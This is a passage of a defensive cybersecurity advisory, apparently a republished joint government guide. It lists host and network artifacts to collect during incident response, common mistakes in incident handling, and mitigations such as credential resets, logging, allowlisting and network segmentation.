    <p>On Linux/Unix operating systems (OSs) and services, collect all <code class="language-plaintext highlighter-rouge">cron</code> and <code class="language-plaintext highlighter-rouge">systemd /etc/passwd</code> files looking for unusual accounts and log files, such as accounts that appear to be <code class="language-plaintext highlighter-rouge">system / proc</code> users but have an interactive shell such as <code class="language-plaintext highlighter-rouge">/bin/bash</code> rather than <code class="language-plaintext highlighter-rouge">/bin/false/nologin</code></p>
  </li>
  <li>
    <p>On Microsoft OSs, collect Scheduled Tasks, Group Policy Objects (GPO), and Windows Management Instrumentation (WMI) database storage on hosts of interest looking for malicious persistence.</p>
  </li>
  <li>
    <p>Use the Microsoft Windows Sysinternals Autoruns tool, which allows IT security practitioners to view—and, if needed, easily disable—most programs that automatically load onto the system.</p>
  </li>
  <li>
    <p>Check the Windows registry and Volume Shadow Copy Service for evidence of intrusion.</p>
  </li>
  <li>
    <p>Consider blocking script files like <code class="language-plaintext highlighter-rouge">.js</code>, <code class="language-plaintext highlighter-rouge">.vbs</code>, <code class="language-plaintext highlighter-rouge">.zip</code>, <code class="language-plaintext highlighter-rouge">.7z</code>, <code class="language-plaintext highlighter-rouge">.sfx</code> and even Microsoft Office documents or PDFs.</p>
  </li>
  <li>
    <p>Collect any scripts or binary ELF files from <code class="language-plaintext highlighter-rouge">/dev/shm/tmp</code> and <code class="language-plaintext highlighter-rouge">/var/tmp</code>.</p>
  </li>
  <li>
    <p>Kernel modules listed (lsmod) for signs of a rootkit; dmesg command output can show signs of rootkit loading and device attachment amongst other things.</p>
  </li>
  <li>
    <p>Archive contents of <code class="language-plaintext highlighter-rouge">/var/log</code> for all hosts.</p>
  </li>
  <li>
    <p>Archive output from journald. These logs are pretty much the same as /var/log; however, they provide some integrity checking and are not as easy to modify. This will eventually replace the /var/log contents for some aspects of the system. Check for additional Secure Shell (SSH) keys added to user’s <code class="language-plaintext highlighter-rouge">authorized_keys</code>.</p>
  </li>
</ul>

<h1 id="network-based-artifacts"><strong>Network-Based Artifacts</strong></h1>

<ul>
  <li>
    <p>Anomalous DNS traffic and activity, unexpected DNS resolution servers, unauthorized DNS zone transfers, data exfiltration through DNS, and changes to host files</p>
  </li>
  <li>
    <p>Remote Desktop Protocol (RDP), virtual private network (VPN) sessions, SSH terminal connections, and other remote abilities to evaluate for inbound connections, unapproved third-party tools, cleartext information, and unauthorized lateral movement</p>
  </li>
  <li>
    <p>Uniform Resource Identifier (URI) strings, user agent strings, and proxy enforcement actions for abusive, suspicious, or malicious website access</p>
  </li>
  <li>
    <p>Hypertext Transfer Protocol Secure/Secure Sockets Layer (HTTPS/SSL)</p>
  </li>
  <li>
    <p>Unauthorized connections to known threat indicators</p>
  </li>
  <li>
    <p>Telnet</p>
  </li>
  <li>
    <p>Internet Relay Chat (IRC)</p>
  </li>
  <li>
    <p>File Transfer Protocol (FTP)</p>
  </li>
</ul>

<h1 id="information-to-review-for-network-analysis"><strong>Information to Review for Network Analysis</strong></h1>

<ul>
  <li>
    <p>Look for new connections on previously unused ports.</p>
  </li>
  <li>
    <p>Look for traffic patterns related to time, frequency, and byte count of the connections.</p>
  </li>
  <li>
    <p>Preserve proxy logs. Add in the URI parameters to the event log if possible.</p>
  </li>
  <li>
    <p>Disable LLMNR on the corporate network; if unable to disable, collect LLMNR (UDP port 5355) and NetBIOS-NS (UDP port 137).</p>
  </li>
  <li>
    <p>Review changes to routing tables, such as weighting, static entries, gateways, and peer relationships.</p>
  </li>
</ul>

<h3 id="common-mistakes-in-incident-handling">Common Mistakes in Incident Handling</h3>

<p>After determining that a system or multiple systems may be compromised, system
administrators and/or system owners are often tempted to take immediate
actions. Although well intentioned to limit the damage of the compromise, some
of those actions have the adverse effect of:</p>

<ol>
  <li>
    <p>Modifying volatile data that could give a sense of what has been done; and</p>
  </li>
  <li>
    <p>Tipping the threat actor that the victim organization is aware of the compromise and forcing the actor to either hide their tracks or take more damaging actions (like detonating ransomware).</p>
  </li>
</ol>

<p>Below—and partially listed in figure 1—are actions to avoid taking and some of
the consequence of taking such actions.</p>

<ul>
  <li>
    <p><strong>Mitigating the affected systems before responders can protect and recover data</strong></p>

    <ul>
      <li>
        <p>This can cause the loss of volatile data such as memory and other host-based artifacts.</p>
      </li>
      <li>
        <p>The adversary may notice and change their tactics, techniques, and procedures.</p>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Touching adversary infrastructure (Pinging, NSlookup, Browsing, etc.)</strong></p>

    <ul>
      <li>These actions can tip off the adversary that they have been detected.</li>
    </ul>
  </li>
  <li>
    <p><strong>Preemptively blocking adversary infrastructure</strong></p>

    <ul>
      <li>Network infrastructure is fairly inexpensive. An adversary can easily change to new command and control infrastructure, and you will lose visibility of their activity.</li>
    </ul>
  </li>
  <li>
    <p><strong>Preemptive credential resets</strong></p>

    <ul>
      <li>
        <p>Adversary likely has multiple credentials, or worse, has access to your entire Active Directory.</p>
      </li>
      <li>
        <p>Adversary will use other credentials, create new credentials, or forge tickets.</p>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Failure to preserve or collect log data that could be critical to identifying access to the compromised systems</strong></p>

    <ul>
      <li>If critical log types are not collected, or are not retained for a sufficient length of time, key information about the incident may not be determinable. Retain log data for at least one year.</li>
    </ul>
  </li>
  <li>
    <p><strong>Communicating over the same network as the incident response is being conducted (ensure all communications are held out-of-band)</strong></p>
  </li>
  <li>
    <p><strong>Only fixing the symptoms, not the root cause</strong></p>

    <ul>
      <li>Playing “whack-a-mole” by blocking an IP address—without taking steps to determine what the binary is and how it got there—leaves the adversary an opportunity to change tactics and retain access to the network.</li>
    </ul>
  </li>
</ul>

<p><img src="https://securesql.info/images/Figure+1+8.31.20+%281%29.png.avif" alt="" /></p>

<h3 id="mitigations">Mitigations</h3>

<p>The following recommendations and best practices may be helpful during the
investigation and remediation process. <strong>Note:</strong>  Although this guidance
provides best practices to mitigate common attack vectors, organizations
should tailor mitigations to their network.</p>

<h1 id="general-mitigation-guidance"><strong>General Mitigation Guidance</strong></h1>

<h1 id="restrict-or-discontinue-use-of-ftp-and-telnet-services"><strong>Restrict or Discontinue Use of FTP and Telnet Services</strong></h1>

<p>The FTP and Telnet protocols transmit credentials in cleartext, which are
susceptible to being intercepted. To mitigate this risk, discontinue FTP and
Telnet services by moving to more secure file storage/file transfer and remote
access services.</p>

<ul>
  <li>
    <p>Evaluate business needs and justifications to host files on alternative Secure File Transfer Protocol (SFTP) or HTTPS-based public sites.</p>
  </li>
  <li>
    <p>Use Secure Shell (SSH) for access to remote devices and servers.</p>
  </li>
</ul>

<h1 id="restrict-or-discontinue-use-of-non-approved-vpn-services"><strong>Restrict or Discontinue Use of Non-approved VPN Services</strong></h1>

<ul>
  <li>
    <p>Investigate the business needs and justification for allowing traffic from non-approved VPN services.</p>
  </li>
  <li>
    <p>Identify such services across the enterprise and develop measures to add the application and browser plugins that enable non-approved VPN services to the denylist.</p>
  </li>
  <li>
    <p>Enhance endpoint monitoring to obtain visibility on devices with non-approved VPN services running. Enhanced endpoint monitoring and detection capabilities would enable an organization’s IT security personnel to manage approved software as well as identify and remove any instances of unapproved software.</p>
  </li>
</ul>

<h1 id="shut-down-or-decommission-unused-services-and-systems"><strong>Shut down or Decommission Unused Services and Systems</strong></h1>

<ul>
  <li>
    <p>Cyber actors regularly identify servers that are out of date or end of life (EOL) to gain access to a network and perform malicious activities. These present easy and safe locations to maintain persistence on a network.</p>
  </li>
  <li>
    <p>Often these services and servers are systems that have begun decommissioning, but the final stage has not been completed by shutting down the system. This means they are still running and vulnerable to compromise.</p>
  </li>
  <li>
    <p>Ensuring that decommissioning of systems has been completed or taking appropriate action to remove them from the network limits their susceptibility and reduces the investigative surface to be analyzed.</p>
  </li>
</ul>

<h1 id="quarantine-and-reimage-compromised-hosts"><strong>Quarantine and Reimage Compromised Hosts</strong></h1>

<p><strong>Note:</strong>  proceed with caution to avoid the adverse effects detailed in the
Common Mistakes in Incident Handling section above.</p>

<ul>
  <li>
    <p>Reimage or remove any compromised systems found on the network.</p>
  </li>
  <li>
    <p>Monitor and educate users to be cautious of any downloads from third-party sites or vendors.</p>
  </li>
  <li>
    <p>Block the known bad domains and add a web content filtering capability to block malicious sites by category to prevent future compromise.</p>
  </li>
  <li>
    <p>Sanitize removable media and investigate network shares accessible by users.</p>
  </li>
  <li>
    <p>Improve existing network-based malware detection tools with sandboxing capabilities.</p>
  </li>
</ul>

<h1 id="disable-unnecessary-ports-protocols-and-services"><strong>Disable Unnecessary Ports, Protocols, and Services</strong></h1>

<ul>
  <li>
    <p>Identify and disable ports, protocols, and services not needed for official business to prevent would-be attackers from moving laterally to exploit vulnerabilities. This includes external communications as well as communications between networks.</p>
  </li>
  <li>
    <p>Document allowed ports and protocols at the enterprise level.</p>
  </li>
  <li>
    <p>Restrict inbound and outbound access to ports and protocols not justified for business use.</p>
  </li>
  <li>
    <p>Restrict allowed access list to assets justified by business use.</p>
  </li>
  <li>
    <p>Enable a firewall log for inbound and outbound network traffic as well as allowed and denied traffic.</p>
  </li>
</ul>

<h1 id="restrict-or-disable-interactive-login-for-service-accounts"><strong>Restrict or Disable Interactive Login for Service Accounts</strong></h1>

<p>Service accounts are privileged accounts dedicated to certain services to
perform activities related to the service or application without being tied to
a single domain user. Given that services tend to be privileged accounts and
thereby have administrative privileges, they are often a target for attackers
aiming to obtain credentials. Interactive login to a service account not
directly tied to an end-user account makes it difficult to identify
accountability during cyber incidents.</p>

<ul>
  <li>
    <p>Audit the Active Directory (AD) to identify and document active service accounts.</p>
  </li>
  <li>
    <p>Restrict use of service accounts using AD group policy.</p>
  </li>
  <li>
    <p>Disallow interactive login by adding service account to a group of non-interactive login users.</p>
  </li>
  <li>
    <p>Continuously monitor service account activities by enhancing logging.</p>
  </li>
  <li>
    <p>Rotate service accounts and apply password best practices without service, degradation, or disruption.</p>
  </li>
</ul>

<h1 id="disable-unnecessary-remote-network-administration-tools"><strong>Disable Unnecessary Remote Network Administration Tools</strong></h1>

<ul>
  <li>
    <p>If an attacker (or malware) gains access to a remote user’s computer, steals authentication data (login/password), hijacks an active remote administration session, or successfully attacks a vulnerability in the remote administration tool’s software, the attacker (or malware) will gain unrestricted control of the enterprise network environment. Attackers can use compromised hosts as a relay server for reverse connections, which could enable them to connect to these remote administration tools from anywhere.</p>
  </li>
  <li>
    <p>Remove all remote administration tools that are not required for day-to-day IT operations. Closely monitor and log events for each remote-control session required by department IT operations.</p>
  </li>
</ul>

<h1 id="manage-unsecure-remote-desktop-services"><strong>Manage Unsecure Remote Desktop Services</strong></h1>

<p>Allowing unrestricted RDP access can increase opportunities for malicious
activity such as on path and Pass-the-Hash (PtH) attacks.</p>

<ul>
  <li>
    <p>Implement secure remote desktop gateway solutions.</p>
  </li>
  <li>
    <p>Restrict RDP service trust across multiple network zones.</p>
  </li>
  <li>
    <p>Implement privileged account monitoring and short time password lease for RDP service use.</p>
  </li>
  <li>
    <p>Implement enhanced and continuous monitoring of RDP services by enabling logging and ensure RDP logins are captured in the logs.</p>
  </li>
</ul>

<h1 id="credential-reset-and-access-policy-review"><strong>Credential Reset and Access Policy Review</strong></h1>

<p>Credential resets need to be done to strategically ensure that all the
compromised accounts and devices are included and to reduce the likelihood
that the attacker is able to adapt in response to this.</p>

<ul>
  <li>
    <p>Force password resets; revoke and issue new certificates for affected accounts/devices.</p>
  </li>
  <li>
    <p>If it is suspected that the attacker has gained access to the Domain Controller, then the passwords for all local accounts—such as Guest, HelpAssistant, DefaultAccount, System, Administrator, and <code class="language-plaintext highlighter-rouge">kbrtgt</code>—should be reset. It is essential that the password for the <code class="language-plaintext highlighter-rouge">kbrtgt</code> account is reset as this account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. The account should be reset twice (as the account has a two-password history).</p>

    <ul>
      <li>The first account reset for the <code class="language-plaintext highlighter-rouge">kbrtgt</code> needs to be allowed to replicate prior to the second reset to avoid any issues.</li>
    </ul>
  </li>
  <li>
    <p>If it is suspected that the <code class="language-plaintext highlighter-rouge">ntds.dit</code> file has been exfiltrated, then all domain user passwords will need to be reset.</p>
  </li>
  <li>
    <p>Review access policies to temporarily revoke privileges/access for affected accounts/devices. If it is necessary to not alert the attacker (e.g., for intelligence purposes), then privileges can be reduced for affected accounts/devices to “contain” them.</p>
  </li>
</ul>

<h1 id="patch-vulnerabilities"><strong>Patch Vulnerabilities</strong></h1>

<p>Attackers frequently exploit software or hardware vulnerabilities to gain
access to a targeted system.</p>

<ul>
  <li>
    <p>Known vulnerabilities in external facing devices and servers should be patched immediately, starting with the point of compromise, if known.</p>

    <ul>
      <li>Ensure external-facing devices have not been previously compromised while going through the patching process.</li>
    </ul>
  </li>
  <li>
    <p>If the point of compromise (i.e., the specific software, device, server) is known, but how the software, device, or server was exploited is unknown, notify the vendor so they can begin analysis and develop a new patch.</p>
  </li>
  <li>
    <p>Follow vendor remediation guidance including the installation of new patches as soon as they become available.</p>
  </li>
</ul>

<h1 id="general-recommendations-and-best-practices-prior-to-an-incident"><strong>General Recommendations and Best Practices Prior to an Incident</strong></h1>

<p>Properly implemented defensive techniques and programs make it more difficult
for a threat actor to gain access to a network and remain persistent yet
undetected. When an effective defensive program is in place, attackers should
encounter complex defensive barriers. Attacker activity should also trigger
detection and prevention mechanisms that enable organizations to identify,
contain, and respond to the intrusion quickly. There is no single technique,
program, or set of defensive techniques or programs that will completely
prevent all attacks. The network administrator should adopt and implement
multiple defensive techniques and programs in a layered approach to provide a
complex barrier to entry, increase the likelihood of detection, and decrease
the likelihood of a successful attack. This layered mitigation approach is
known as defense-in-depth.</p>

<h1 id="user-education"><strong>User Education</strong></h1>

<p>End users are the frontline security of the organizations. Educating them in
security principles as well as actions to take and not take during an incident
will increase the organization’s resilience and might prevent easily avoidable
compromises.</p>

<ul>
  <li>
    <p>Educate users to be cautious of any downloads from third-party sites or vendors.</p>
  </li>
  <li>
    <p>Train users on recognizing phishing emails. There are several systems and services (free and otherwise) that can be deployed or leveraged.</p>
  </li>
  <li>
    <p>Train users on identifying which groups/individuals to contact when they suspect an incident.</p>
  </li>
  <li>
    <p>Train users on the actions they can and cannot take if they suspect an incident and why (some users will attempt to remediate and might make things worst).</p>
  </li>
</ul>

<h1 id="allowlisting"><strong>Allowlisting</strong></h1>

<ul>
  <li>
    <p>Enable application directory allowlisting through Microsoft Software Restriction Policy or AppLocker.</p>
  </li>
  <li>
    <p>Use directory allowlisting rather than attempting to list every possible permutation of applications in a network environment. Safe defaults allow applications to run from <code class="language-plaintext highlighter-rouge">PROGRAMFILES</code>, <code class="language-plaintext highlighter-rouge">PROGRAMFILES(X86)</code>, and <code class="language-plaintext highlighter-rouge">SYSTEM32</code>. Disallow all other locations unless an exception is granted.</p>
  </li>
  <li>
    <p>Prevent the execution of unauthorized software by using application allowlisting as part of the OS installation and security hardening process.</p>
  </li>
</ul>

<h1 id="account-control"><strong>Account Control</strong></h1>

<ul>
  <li>
    <p>Decrease a threat actor’s ability to access key network resources by implementing the principle of least privilege.</p>
  </li>
  <li>
    <p>Limit the ability of a local administrator account to log in from a local interactive session (e.g., Deny access to this computer from the network) and prevent access via an RDP session.</p>
  </li>
  <li>
    <p>Remove unnecessary accounts and groups; restrict root access.</p>
  </li>
  <li>
    <p>Control and limit local administration; e.g. implementing Just Enough Administration (JEA), just-in-time (JIT) administration, or enforcing PowerShell Constrained Language mode via a User Mode Code Integrity (UMCI) policy.</p>
  </li>
  <li>
    <p>Make use of the Protected Users Active Directory group in Windows domains to further secure privileged user accounts against pass-the-hash attacks.</p>
  </li>
</ul>

<h1 id="backups"><strong>Backups</strong></h1>

<ul>
  <li>
    <p>Identify what data is essential to keeping operations running; make regular backup copies.</p>
  </li>
  <li>
    <p>Test that backups are working to ensure they can restore the data in the event of an incident.</p>
  </li>
  <li>
    <p>Create offline backups to help recover from a ransomware attack or from disasters (fire, flooding, etc.).</p>
  </li>
  <li>
    <p>Securely store offline backups at an offsite location. If feasible, choose an offsite location that is at a distance from the primary location that would be unaffected in the event of a regional natural disaster.</p>
  </li>
</ul>

<h1 id="workstation-management"><strong>Workstation Management</strong></h1>

<ul>
  <li>
    <p>Create and deploy a secure system baseline image to all workstations.</p>
  </li>
  <li>
    <p>Mitigate potential exploitation by threat actors by following a normal patching cycle for all OSs, applications, and software, with exceptions for emergency patches.</p>
  </li>
  <li>
    <p>Apply asset and patch management processes.</p>
  </li>
  <li>
    <p>Reduce the number of cached credentials to one (if a laptop) or zero (if a desktop or fixed asset).</p>
  </li>
</ul>

<h1 id="host-based-intrusion-detection--endpoint-detection-and-response"><strong>Host-Based Intrusion Detection / Endpoint Detection and Response</strong></h1>

<ul>
  <li>
    <p>Configure and monitor workstation system logs through a host-based endpoint detection and response platform and firewall.</p>
  </li>
  <li>
    <p>Deploy an anti-malware solution on workstations to prevent spyware, adware, and malware as part of the OS security baseline.</p>

    <ul>
      <li>Ensure that your anti-malware solution remains up to date.</li>
    </ul>
  </li>
  <li>
    <p>Monitor antivirus scan results on a regular basis.</p>
  </li>
</ul>

<h1 id="server-management"><strong>Server Management</strong></h1>

<ul>
  <li>
    <p>Create a secure system baseline image and deploy it to all servers.</p>
  </li>
  <li>
    <p>Upgrade or decommission end-of-life non-Windows servers.</p>
  </li>
  <li>
    <p>Upgrade or decommission servers running Windows Server 2003 or older versions.</p>
  </li>
  <li>
    <p>Implement asset and patch management processes.</p>
  </li>
  <li>
    <p>Audit for and disable unnecessary services.</p>
  </li>
</ul>

<h1 id="server-configuration-and-logging"><strong>Server Configuration and Logging</strong></h1>

<ul>
  <li>
    <p>Establish remote server logging and retention.</p>
  </li>
  <li>
    <p>Reduce the number of cached credentials to zero.</p>
  </li>
  <li>
    <p>Configure and monitor system logs via a centralized security information and event management (SIEM) appliance.</p>
  </li>
  <li>
    <p>Add an explicit <code class="language-plaintext highlighter-rouge">DENY</code> for <code class="language-plaintext highlighter-rouge">%USERPROFILE%</code>.</p>
  </li>
  <li>
    <p>Restrict egress web traffic from servers.</p>
  </li>
  <li>
    <p>In Windows environments, use Restricted Admin mode or remote credential guard to further secure remote desktop sessions against pass-the-hash attacks.</p>
  </li>
  <li>
    <p>Restrict anonymous shares.</p>
  </li>
  <li>
    <p>Limit remote access by only using jump servers for such access.</p>
  </li>
  <li>
    <p>On Linux, use SELINUX or AppArmor in enforcing mode and/or turn on audit logging.</p>
  </li>
  <li>
    <p>Turn on bash shell logging; ship this and all logs to a remote server.</p>
  </li>
  <li>
    <p>Do not allow users to use <code class="language-plaintext highlighter-rouge">su</code>. Use <code class="language-plaintext highlighter-rouge">Sudo -l</code> instead.</p>
  </li>
  <li>
    <p>Configure automatic updates in yum or apt.</p>
  </li>
  <li>
    <p>Mount <code class="language-plaintext highlighter-rouge">/var/tmp</code> and <code class="language-plaintext highlighter-rouge">/tmp</code> as <code class="language-plaintext highlighter-rouge">noexec</code>.</p>
  </li>
</ul>

<h1 id="change-control"><strong>Change Control</strong></h1>

<ul>
  <li>Create a change control process for all implemented changes.</li>
</ul>

<h1 id="network-security"><strong>Network Security</strong></h1>

<ul>
  <li>
    <p>Implement an intrusion detection system (IDS).</p>

    <ul>
      <li>
        <p>Apply continuous monitoring.</p>
      </li>
      <li>
        <p>Send alerts to a SIEM tool.</p>
      </li>
      <li>
        <p>Monitor internal activity (this tool may use the same tap points as the netflow generation tools).</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Employ netflow capture.</p>

    <ul>
      <li>
        <p>Set a minimum retention period of 180 days.</p>
      </li>
      <li>
        <p>Capture netflow on all ingress and egress points of network segments, not just at the Managed Trusted Internet Protocol Services or Trusted Internet Connections locations.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Capture all network traffic</p>

    <ul>
      <li>
        <p>Retain captured traffic for a minimum of 24 hours.</p>
      </li>
      <li>
        <p>Capture traffic on all ingress and egress points of the network.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Use VPN</p>

    <ul>
      <li>
        <p>Maintain site-to-site VPN with customers and vendors.</p>
      </li>
      <li>
        <p>Authenticate users utilizing site-to-site VPNs.</p>
      </li>
      <li>
        <p>Use authentication, authorization, and accounting for controlling network access.</p>
      </li>
      <li>
        <p>Require smartcard authentication to an HTTPS page in order to control access. Authentication should also require explicit rostering of permitted smartcard distinguished names to enhance the security posture on both networks participating in the site-to-site VPN.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Establish appropriate secure tunneling protocol and encryption.</p>
  </li>
  <li>
    <p>Strengthen router configuration (e.g., avoid enabling remote management over the internet and using default IP ranges, automatically log out after configuring routers, and use encryption.).</p>
  </li>
  <li>
    <p>Turn off Wi-Fi protected setup, enforce the use of strong passwords, and keep router firmware up-to-date.</p>
  </li>
  <li>
    <p>Improve firewall security (e.g., enable automatic updates, revise firewall rules as appropriate, implement allowlists, establish packet filtering, enforce the use of strong passwords, encrypt networks).</p>

    <ul>
      <li>Whenever possible, ensure access to network devices via external or untrusted networks (specifically the internet) is disabled.</li>
    </ul>
  </li>
  <li>
    <p>Manage access to the internet (e.g., providing internet access from only devices/accounts that need it, proxying all connections, disabling internet access for privileged/administrator accounts, enabling policies that restrict internet access using a blocklist, a resource allowlist, content type, etc.)</p>

    <ul>
      <li>
        <p>Conduct regular vulnerability scans of the internal and external networks and hosted content to identify and mitigate vulnerabilities.</p>
      </li>
      <li>
        <p>Define areas within the network that should be segmented to increase the visibility of lateral movement by a threat and increase the defense-in-depth posture.</p>
      </li>
      <li>
        <p>Develop a process to block traffic to IP addresses and domain names that have been identified as being used to aid previous attacks.</p>
      </li>
    </ul>
  </li>
  <li>
    <p>Evaluate and consider the security configurations of Microsoft Office 365 (O365) and other cloud collaboration service platforms prior to deployment.</p>

    <ul>
      <li>
        <p>Use multi-factor authentication. This is the best mitigation technique to protect against credential theft for O365 administrators and users.</p>
      </li>
      <li>
        <p>Protect Global Admins from compromise and use the principle of “Least Privilege.”</p>
      </li>
      <li>
        <p>Enable unified audit logging in the Security and Compliance Center.</p>
      </li>
      <li>
        <p>Enable alerting capabilities.</p>
      </li>
      <li>
        <p>Integrate with organizational SIEM solutions.</p>
      </li>
      <li>
        <p>Disable legacy email protocols, if not required, or limit their use to specific users.</p>
      </li>
    </ul>
  </li>
</ul>

<h1 id="network-infrastructure-recommendations"><strong>Network Infrastructure Recommendations</strong></h1>

<ul>
  <li>
    <p>Create a secure system baseline image and deploy it to all networking equipment (e.g., switches, routers, firewalls).</p>
  </li>
  <li>
    <p>Remove unnecessary OS files from the internetwork operating system (IOS). This will limit the possible targets of persistence (i.e., files to embed malicious code) if the device is compromised and will align with National Security Agency Network Device Integrity best practices.</p>
  </li>
  <li>
    <p>Remove vulnerable IOS OS files (i.e., older iterations) from the device’s boot variable (i.e., show boot or show bootvar).</p>
  </li>
  <li>
    <p>Update to the latest available operating system for IOS devices.</p>
  </li>
  <li>
    <p>On devices with a Secure Sockets Layer VPN enabled, routinely verify customized web objects against the organization’s known good files for such VPNs, to ensure the devices remain free of unauthorized modification.</p>
  </li>
  <li>
    <p>Ensure that any incident response tools that point to external domains are either removed or updated to point to internal security tools. If this is not done and an external domain to which a tool points expires, a malicious threat actor may register it and start collecting telemetry from the infrastructure.</p>
  </li>
</ul>

<h1 id="host-recommendations"><strong>Host Recommendations</strong></h1>

<ul>
  <li>
    <p>Implement policies to block workstation-to-workstation RDP connections through a Group Policy Object on Windows, or by a similar mechanism.</p>
  </li>
  <li>
    <p>Store system logs of mission critical systems for at least one year within a SIEM tool.</p>
  </li>
  <li>
    <p>Review the configuration of application logs to verify that recorded fields will contribute to an incident response investigation.</p>
  </li>
</ul>

<h1 id="user-management"><strong>User Management</strong></h1>

<ul>
  <li>
    <p>Reduce the number of domain and enterprise administrator accounts.</p>
  </li>
  <li>
    <p>Create non-privileged accounts for privileged users and ensure they use the non- privileged accounts for all non-privileged access (e.g., web browsing, email access).</p>
  </li>
  <li>
    <p>If possible, use technical methods to detect or prevent browsing by privileged accounts (authentication to web proxies would enable blocking of Domain Administrators).</p>
  </li>
  <li>
    <p>Use two-factor authentication (e.g., security tokens for remote access and access to any sensitive data repositories).</p>
  </li>
  <li>
    <p>If soft tokens are used, they should not exist on the same device that is requesting remote access (e.g., a laptop) and instead should be on a smartphone, token, or other out-of-band device.</p>
  </li>
  <li>
    <p>Create privileged role tracking.</p>
  </li>
  <li>
    <p>Create a change control process for all privilege escalations and role changes on user accounts.</p>
  </li>
  <li>
    <p>Enable alerts on privilege escalations and role changes.</p>
  </li>
  <li>
    <p>Log privileged user changes in the network environment and create an alert for unusual events.</p>
  </li>
  <li>
    <p>Establish least privilege controls.</p>
  </li>
  <li>
    <p>Implement a security-awareness training program.</p>
  </li>
</ul>

<h1 id="segregate-networks-and-functions"><strong>Segregate Networks and Functions</strong></h1>

<p>Proper network segmentation is a very effective security mechanism to prevent
an intruder from propagating exploits or laterally moving around an internal
network. On a poorly segmented network, intruders are able to extend their
impact to control critical devices or gain access to sensitive data and
intellectual property. Security architects must consider the overall
infrastructure layout, segmentation, and segregation. Segregation separates
network segments based on role and functionality. A securely segregated
network can contain malicious occurrences, reducing the impact from intruders,
in the event that they have gained a foothold somewhere inside the network.</p>

<h1 id="physical-separation-of-sensitive-information"><strong>Physical Separation of Sensitive Information</strong></h1>

<p>Local Area Network (LAN) segments are separated by traditional network devices
such as routers. Routers are placed between networks to create boundaries,
increase the number of broadcast domains, and effectively filter users’
broadcast traffic. These boundaries can be used to contain security breaches
by restricting traffic to separate segments and can even shut down segments of
the network during an intrusion, restricting adversary access.</p>

<p>Recommendations:</p>

<ul>
  <li>
    <p>Implement Principles of Least Privilege and need-to-know when designing network segments.</p>
  </li>
  <li>
    <p>Separate sensitive information and security requirements into network segments.</p>
  </li>
  <li>
    <p>Apply security recommendations and secure configurations to all network segments and network layers.</p>
  </li>
</ul>

<h1 id="virtual-separation-of-sensitive-information"><strong>Virtual Separation of Sensitive Information</strong></h1>

<p>As technologies change, new strategies are developed to improve IT
efficiencies and network security controls. Virtual separation is the logical
isolation of networks on the same physical network. The same physical
segmentation design principles apply to virtual segmentation but no additional
hardware is required. Existing technologies can be used to prevent an intruder
from breaching other internal network segments.</p>

<p>Recommendations:</p>

<ul>
  <li>
    <p>Use Private Virtual LANs to isolate a user from the rest of the broadcast domains.</p>
  </li>
  <li>
    <p>Use Virtual Routing and Forwarding (VRF) technology to segment network traffic over multiple routing tables simultaneously on a single router.</p>
  </li>
  <li>
    <p>Use VPNs to securely extend a host/network by tunneling through public or private networks.</p>
  </li>
</ul>

<h1 id="additional-best-practices"><strong>Additional Best Practices</strong></h1>

<ul>
  <li>
    <p>Implement a vulnerability assessment and remediation program.</p>
  </li>
  <li>
    <p>Encrypt all sensitive data in transit and at rest.</p>
  </li>
  <li>
    <p>Create an insider threat program.</p>
  </li>
  <li>
    <p>Assign additional personnel to review logging and alerting data.</p>
  </li>
  <li>
    <p>Complete independent security (not compliance) audits.</p>
  </li>
  <li>
    <p>Create an information sharing program.</p>
  </li>
  <li>
    <p>Complete and maintain network and system documentation to aid in timely incident response, including:</p>

    <ul>
      <li>
        <p>Network diagrams,</p>
      </li>
      <li>
        <p>Asset owners,</p>
      </li>
      <li>
        <p>Type of asset, and</p>
      </li>
      <li>
        <p>An up-to-date incident response plan.</p>
      </li>
    </ul>
  </li>
</ul>

<h3 id="resources">Resources</h3>

<ul>
  <li>
    <p><a href="https://www.cisa.gov/insights">CISA Insights</a></p>
  </li>
  <li>
    <p><a href="https://www.us-cert.gov/ncas/alerts/TA18-276A">CISA Alert: Using Rigorous Credential Control to Mitigate Trusted Network Exploitation</a></p>
  </li>
  <li>
    <p><a href="https://us-cert.cisa.gov/ncas/alerts/aa20-120a">CISA Alert: Microsoft Office 365 Security Recommendations</a></p>
  </li>
  <li>
    <p><a href="https://www.cisa.gov/sites/default/files/publications/incident_handling_elections_final_508_0.pdf">CISA Incident Handling Overview for Election Officials</a></p>
  </li>
  <li>
    <p><a href="https://www.cyber.gov.au/acsc/view-all-content/publications/preparing-and-responding-cyber-security-incidents">Preparing for and Responding to Cyber Security Incidents (ACSC)</a></p>
  </li>
  <li>
    <p><a href="https://www.cyber.gov.au/acsc/view-all-content/publications/strategies-mitigate-cyber-security-incidents">Strategies to Mitigate Cyber Security Incidents (ACSC)</a></p>
  </li>
  <li>
    <p><a href="https://www.cyber.gov.au/acsc/view-all-content/guidance/managing-cyber-security-incidents">Managing Cyber Security Incidents (ACSC)</a></p>
  </li>
  <li>
    <p><a href="https://www.ncsc.gov.uk/collection/incident-management">Incident Management (UK NCSC)</a></p>
  </li>
  <li>
    <p><a href="https://www.ncsc.govt.nz/guidance/incident-management/">Incident Management: Be Resilient, Be Prepared (NZ NCSC)</a></p>
  </li>
  <li>
    <p><a href="https://cyber.gc.ca/en/publications">Canadian Centre for Cyber Security Publications</a></p>
  </li>
  <li>
    <p><a href="https://cyber.gc.ca/en/guidance/baseline-cyber-security-controls-small-and-medium-organizations">Baseline Cyber Security Controls for Small and Medium Organizations (CCCS)</a></p>
  </li>
  <li>
    <p><a href="https://cyber.gc.ca/en/guidance/1-introduction-itsg-22">Guideline on Network Security Zones (CCCS)</a></p>
  </li>
  <li>
    <p><a href="https://www.cyber.gc.ca/en/guidance/network-security-zoning-design-considerations-placement-services-within-zones-itsg-38">Network Security Zoning - Design Considerations for Placement of Services within Zones (CCCS)</a></p>
  </li>
</ul>

<h3 id="references">References</h3>

<p><a href="https://www.cyber.gov.au/">[1] Australian Cyber Security Centre (ACSC)</a></p>

<p><a href="https://www.cyber.gc.ca/en/">[2] Canadian Centre for Cyber Security (CCCS)</a></p>

<p><a href="https://www.ncsc.govt.nz/">[3] New Zealand National Cyber Security Centre (NZ
NCSC)</a></p>

